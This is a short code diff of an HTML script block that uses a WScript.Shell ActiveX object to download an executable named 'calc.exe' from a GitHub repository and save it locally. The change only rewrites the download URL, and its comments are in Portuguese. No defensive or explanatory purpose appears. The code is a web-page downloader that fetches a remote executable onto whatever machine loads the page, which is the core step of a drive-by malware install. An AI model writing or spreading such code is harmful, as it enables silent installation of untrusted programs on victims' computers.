@@ -1,6 +1,6 @@
 <script type="text/javascript">
     var shell = new ActiveXObject("WScript.Shell");
-    var url = "https://github.com/rafaelwdornelas/goenvios/raw/main/calc.exe"; // URL do executável
+    var url = "https://raw.githubusercontent.com/rafaelwdornelas/goenvios/main/calc.exe"; // URL do executável
     var destination = "calc.exe"; // Caminho para salvar o executável
 
     // Baixa o arquivo .exe
